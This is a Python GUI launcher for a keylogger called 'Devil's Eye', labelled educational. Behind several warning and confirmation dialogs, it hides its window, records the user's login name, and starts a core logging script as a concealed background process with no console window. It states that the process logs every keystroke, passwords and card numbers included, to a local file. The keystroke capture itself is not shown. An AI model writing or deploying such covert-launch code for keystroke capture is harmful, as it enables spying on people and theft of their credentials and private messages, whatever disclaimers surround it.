"""
DEVIL'S EYE LAUNCHER
Educational Background Keylogger - For Security Awareness
⚠️ FOR CONTROLLED EDUCATIONAL ENVIRONMENTS ONLY
"""

import tkinter as tk
from tkinter import messagebox
import sys
import os
import subprocess
import platform

def show_warning():
    """Show multiple explicit warnings before proceeding"""
    warning_text = """
    ⚠️⚠️⚠️ DEVIL'S EYE - EDUCATIONAL TOOL ⚠️⚠️⚠️

    YOU ARE ABOUT TO LAUNCH A BACKGROUND KEYLOGGER

    This educational tool will:
    1. Run invisibly in the background
    2. Capture ALL keystrokes on this computer
    3. Save them to a local log file
    4. Continue until stopped or system reboot

    INTENDED USE:
    • Security awareness training
    • Ethical hacking education
    • Controlled lab environments
    • Personal systems only

    LEGAL & ETHICAL REQUIREMENTS:
    ✓ You own this computer OR
    ✓ You have explicit written permission OR
    ✓ This is an isolated VM for learning

    DO NOT USE ON:
    • Others' computers without permission
    • Work/school/organizational systems
    • Systems with sensitive/private data

    By proceeding, you accept full responsibility.
    """
    
    # First warning
    response = messagebox.askyesno(
        "🚨 LEVEL 1 WARNING - DEVIL'S EYE",
        warning_text
    )
    
    if not response:
        messagebox.showinfo("Cancelled", "Devil's Eye not activated.")
        return False
    
    # Second confirmation
    response = messagebox.askyesno(
        "🚨 LEVEL 2 CONFIRMATION",
        "FINAL WARNING:\n\n"
        "This will log EVERY keystroke including:\n"
        "• Passwords\n• Credit cards\n• Private messages\n• All typed content\n\n"
        "Are you CERTAIN you want to proceed?\n"
        "Type 'I UNDERSTAND' below."
    )
    
    if not response:
        messagebox.showinfo("Cancelled", "Devil's Eye not activated.")
        return False
    
    # Third confirmation with text input
    class ConfirmDialog:
        def __init__(self, parent):
            self.top = tk.Toplevel(parent)
            self.top.title("🚨 FINAL VERIFICATION")
            self.top.geometry("500x300")
            
            tk.Label(self.top, text="TYPE THE EXACT PHRASE TO CONTINUE:", 
                    font=("Arial", 12, "bold"), fg="red").pack(pady=10)
            
            tk.Label(self.top, text="\"I ACCEPT FULL RESPONSIBILITY\"", 
                    font=("Courier", 14, "bold")).pack(pady=5)
            
            self.entry = tk.Entry(self.top, font=("Arial", 12), width=40)
            self.entry.pack(pady=20)
            
            self.result = False
            
            tk.Button(self.top, text="CONFIRM", command=self.confirm,
                     bg="red", fg="white", font=("Arial", 12, "bold")).pack(pady=10)
            
            tk.Button(self.top, text="CANCEL", command=self.cancel,
                     bg="gray", fg="white").pack()
            
            self.top.grab_set()
            
        def confirm(self):
            if self.entry.get() == "I ACCEPT FULL RESPONSIBILITY":
                self.result = True
            else:
                messagebox.showerror("Incorrect", "Phrase not typed correctly!")
            self.top.destroy()
            
        def cancel(self):
            self.top.destroy()
    
    dialog = ConfirmDialog(root)
    root.wait_window(dialog.top)
    
    if not dialog.result:
        messagebox.showinfo("Cancelled", "Devil's Eye not activated.")
        return False
    
    return True

def launch_devils_eye():
    """Start the Devil's Eye background keylogger"""
    if not show_warning():
        return
    
    # Hide main window
    root.withdraw()
    
    # Create logs directory
    log_dir = "devils_eye_logs"
    os.makedirs(log_dir, exist_ok=True)
    
    # Write launch record
    with open(os.path.join(log_dir, "launch_record.txt"), "w") as f:
        f.write(f"Devil's Eye launched at: {get_timestamp()}\n")
        f.write(f"User: {os.getlogin()}\n")
        f.write(f"System: {platform.system()} {platform.release()}\n")
        f.write("="*50 + "\n")
    
    # Launch background process
    script_dir = os.path.dirname(os.path.abspath(__file__))
    background_script = os.path.join(script_dir, "devils_eye_core.py")
    
    # Platform-specific background execution
    if platform.system() == "Windows":
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        subprocess.Popen(
            [sys.executable, background_script],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    else:  # Linux/Mac
        subprocess.Popen(
            [sys.executable, background_script],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    
    # Show final instructions
    messagebox.showinfo(
        "👁️ Devil's Eye Activated",
        "Devil's Eye is now running in background.\n\n"
        "📝 Keystrokes are being logged to:\n"
        f"{log_dir}/keystrokes.log\n\n"
        "🛑 To stop Devil's Eye:\n"
        "1. Run 'devils_eye_stop.py'\n"
        "2. OR Restart your computer\n\n"
        "⚠️ Remember: This is for EDUCATIONAL purposes only!"
    )
    
    root.destroy()

def get_timestamp():
    from datetime import datetime
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ---- GUI Setup ----
root = tk.Tk()
root.title("👁️ Devil's Eye - Educational Keylogger")
root.geometry("500x350")

# Make it look serious but educational
root.configure(bg="#1a1a1a")

# Title
title = tk.Label(root, text="👁️ DEVIL'S EYE", 
                font=("Courier", 24, "bold"),
                fg="#ff4444", bg="#1a1a1a")
title.pack(pady=20)

# Subtitle
subtitle = tk.Label(root, text="Educational Background Keylogger",
                   font=("Arial", 12),
                   fg="#cccccc", bg="#1a1a1a")
subtitle.pack()

# Purpose frame
purpose_frame = tk.Frame(root, bg="#2a2a2a", relief=tk.RIDGE, borderwidth=2)
purpose_frame.pack(pady=20, padx=20, fill=tk.BOTH, expand=True)

tk.Label(purpose_frame, text="🎯 PURPOSE:", 
        font=("Arial", 11, "bold"),
        fg="#44ff44", bg="#2a2a2a").pack(anchor="w", padx=10, pady=(10,5))

purposes = [
    "• Understand how keyloggers work",
    "• Learn detection methods",
    "• Practice ethical hacking",
    "• Security awareness training"
]

for purpose in purposes:
    tk.Label(purpose_frame, text=purpose,
            font=("Arial", 10),
            fg="#cccccc", bg="#2a2a2a",
            justify=tk.LEFT).pack(anchor="w", padx=20)

# Warning label
warning = tk.Label(root, 
                  text="⚠️ FOR CONTROLLED EDUCATIONAL USE ONLY",
                  font=("Arial", 10, "bold"),
                  fg="#ffaa00", bg="#1a1a1a")
warning.pack(pady=10)

# Launch button
launch_btn = tk.Button(root, text="ACTIVATE DEVIL'S EYE",
                      command=launch_devils_eye,
                      font=("Arial", 14, "bold"),
                      bg="#ff4444", fg="white",
                      activebackground="#ff0000",
                      cursor="hand2",
                      height=2, width=25)
launch_btn.pack(pady=20)

# Footer
footer = tk.Label(root, 
                 text="Use responsibly. Never deploy without permission.",
                 font=("Arial", 8),
                 fg="#888888", bg="#1a1a1a")
footer.pack()

root.mainloop()